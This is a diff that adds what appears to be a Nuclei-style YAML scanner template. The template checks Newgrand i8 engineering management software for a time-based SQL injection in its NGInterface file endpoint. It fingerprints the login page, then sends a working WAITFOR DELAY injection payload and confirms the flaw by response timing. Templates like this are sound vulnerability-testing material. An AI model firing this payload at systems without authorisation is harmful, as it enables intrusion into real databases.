@@ -1,0 +1,52 @@
+id: poc-yaml-newgrand-i8-eems-nginterface-sqli
+info:
+  name: 杭州新中大i8工程企业管理软件 NGInterface SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    杭州新中大i8工程企业管理软件 NGInterface SQL注入漏洞 allows attackers to exploit a time-based SQL injection vulnerability.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /login/login.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NEWGRAND"
+
+  - raw:
+      - |
+        POST /filesrv/NGInterface/Index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        type=getfilelist&guid=';WAITFOR+DELAY+'0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[]"
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2) && duration < to_number(t3)"
